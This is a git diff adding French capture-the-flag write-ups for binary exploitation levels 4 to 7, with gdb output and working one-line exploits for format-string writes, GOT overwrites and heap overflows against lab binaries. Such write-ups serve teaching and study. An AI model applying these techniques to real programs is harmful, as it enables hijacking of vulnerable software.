@@ -211,18 +211,248 @@ x/s 0x804988c
 ## Level4
 
 - **Type de faille** : Format String Vulnerability - 2nd method (using %x and spaces)
+- **Objectif** : modifier la variable globale `m` pour atteindre la valeur attendue.
+
+
+<details>
+<summary>Spoiler</summary>
+
+### 1) Trouver la position de notre entrée sur la pile
+
+```bash
+./level4 
+AAAA %p %p %p %p %p %p %p %p %p %p %p %p %p %p
+AAAA 0xb7ff26b0 0xbffff794 0xb7fd0ff4 (nil) (nil) 0xbffff758 0x804848d 0xbffff550 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x20702520 0x25207025
+
+```
+
+`0x41414141` (= `AAAA`) apparaît au **12e argument**.
+
+### 2) Identifier l'adresse de `m`
+
+```gdb
+disass n
+```
+
+La zone intéressante montre : 0x8049810
+
+```gdb
+0x0804848d <+54>:	mov    0x8049810,%eax
+```
+
+Validation :
+
+```gdb
+x/s 0x8049810
+0x8049810 <m>:	 ""
+```
+
+### 3) Utiliser `%n`
+
+- `%n` écrit le nombre de caractères déjà imprimés à l'adresse fournie.
+- Ici `m` doit valoir `0x1025544` soit `16930116`.
+- On met l'adresse de `m` (4 octets), puis 16930112 chars, puis `%12$n`  
+  => `4 + 16930112 = 16930116`.
+
+- Hors python ne peut pas imprimer autant. Donc on passe par printf
+  => `%16930112s`
+
+</details>
+
+### Solution
+
+```bash
+(python -c 'print "\x10\x98\x04\x08" + "%16930112s" + "%12$n"'; cat) | ./level4 
+```
+
+---
+
+
 
 ## Level5
 
 - **Type de faille** : Format String Vulnerability - PLT overwriting
+- **Idee** : On a un `fgets` mais limite. Il y a une focntion `o()`. On va donc utiliser la GOT et l'overwrite pour remplacer une fonction got.plt par `o()`
+
+
+<details>
+<summary>Spoiler</summary>
+
+### 1) Trouver la position de notre entrée sur la pile
+
+```bash
+./level5 
+AAA %p %p %p %p %p %p %p %p
+AAA 0x200 0xb7fd1ac0 0xb7ff37d0 0x20414141 0x25207025 0x70252070 0x20702520 0x25207025
+
+```
+
+`0x20414141` (= `AAA`) apparaît au **4e argument**.
+
+### 2) Identifier l'adresse de `exit()` pour la remplacer par la fonction `o()`
+
+```gdb
+(gdb) disass exit
+Dump of assembler code for function exit@plt:
+   0x080483d0 <+0>:	jmp    *0x8049838
+   0x080483d6 <+6>:	push   $0x28
+   0x080483db <+11>:	jmp    0x8048370
+End of assembler dump.
+(gdb) 
+
+```
+
+La zone intéressante montre : 0x8049838
+
+```gdb
+(gdb) disass 0x8049838
+Dump of assembler code for function exit@got.plt:
+   0x08049838 <+0>:	(bad)  
+   0x08049839 <+1>:	addl   $0xffffffe6,(%eax,%ecx,1)
+End of assembler dump.
+(gdb) 
+```
+
+L'addresse qu'on va remplacer est **0x08049838**
+
+### 3) Trouver l'address de `o()`
+
+```gdb
+(gdb) p o
+$1 = {<text variable, no debug info>} 0x80484a4 <o>
+(gdb) 
+```
+
+### 4) Preparer le payload
+
+- Premierement on met notre address de `exit@got.plt` ==> **\x38\x98\x04\x08**
+- Deuxiemement on y rajoute l'address de `o()`. Mais cette fois-ci vu que c'est de l'overwrite, on va la mettre via printf. On converti donc en decimal : **134513824** ==> `"%134513824x"`
+- Enfin on y met notre fameux `"%4$n"`
+
+</details>
+
+### Solution
+
+```bash
+(python -c 'print "\x38\x98\x04\x08" + "%134513824x%4$n"'; cat) | ./level5 
+```
+
+---
 
 ## Level6
 
 - **Type de faille** : Heap-Based Buffer Overflow - Basic
+- **Objectif** : Le `main()` utilise une fonction `m()`, qui ne fait rien mais il y a une fonction `n()` qui ouvre un shell -> Remplacer l'appel de `m()` par `n()`
+
+
+<details>
+<summary>Spoiler</summary>
+
+### 1) Trouver l'offset
+
+Dans `gdb ./level6`, envoyer un pattern cyclique, puis analyser l'adresse du segfault :
+
+- Segfault : `0x41346341`
+- **Offset = 72**
+
+### 2) Identifier l'adresse de `n()`
+
+```gdb
+(gdb) print n
+$1 = {<text variable, no debug info>} 0x8048454 <n>
+(gdb)
+```
+
+### 3) Preparer le payload
+
+- Premierement on met notre offset  ==> **72 fois**
+- Puis on y rajoute l'address de `n()` ==> `\x54\x84\x04\x08`
+
+</details>
+
+### Solution
+
+```bash
+./level6 $(python -c 'print "a" * 72 + "\x54\x84\x04\x08"')
+
+```
+
+---
 
 ## Level7
 
 - **Type de faille** : Heap-Based Buffer Overflow - PLT overwriting
+- **Idee** : On combine l'overwrite qu'on a appris avec la string vulnerability et le heap overflow. donc remplacer `puts()` par `m()`
+
+<details>
+<summary>Spoiler</summary>
+
+### 1) Trouver l'offset
+
+
+offset=adresse_cible−adresse_debut_buffer
+Dans ce code précis
+Ordre des allocations :
+
+a = malloc(sizeof(Item))
+a->data = malloc(8)
+b = malloc(sizeof(Item))
+b->data = malloc(8)
+Sur un binaire 32-bit typique :
+
+sizeof(Item) = 8
+un malloc(8) occupe en général un chunk de 0x10 octets
+donc a->data et b seront souvent séparés de 0x10
+Donc :
+
+offset jusqu’à b->type : 16 octets
+offset jusqu’à b->data : 20 octets
+
+
+Donc offset a 20 car on veut ecraser b->data
+
+### 2) Identifier l'adresse de `puts()` et de `m()`
+
+```gdb
+(gdb) disass puts
+Dump of assembler code for function puts@plt:
+   0x08048400 <+0>:	jmp    *0x8049928
+   0x08048406 <+6>:	push   $0x28
+   0x0804840b <+11>:	jmp    0x80483a0
+End of assembler dump.
+(gdb) disass 0x8049928
+Dump of assembler code for function puts@got.plt:
+   0x08049928 <+0>:	push   %es
+   0x08049929 <+1>:	test   %al,(%eax,%ecx,1)
+End of assembler dump.
+(gdb) 
+
+```
+
+```gdb
+(gdb) p m
+$1 = {<text variable, no debug info>} 0x80484f4 <m>
+(gdb) 
+```
+
+
+
+### 3) Preparer le payload
+
+- Premier argument : offset + address de `puts@got.plt`
+- Deuxieme argument : address de `m()`
+
+</details>
+
+### Solution
+
+```bash
+./level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
+```
+
+---
+
+
 
 ## Level8
 
@@ -238,3 +468,9 @@ TODO (à compléter)
 
 Ressource utile pour générer un pattern d'overflow :  
 https://wiremask.eu/tools/buffer-overflow-pattern-generator/?
+
+GOT
+https://en.wikipedia.org/wiki/Global_Offset_Table
+
+PLT
+https://maskray.me/blog/2021-09-19-all-about-procedure-linkage-table
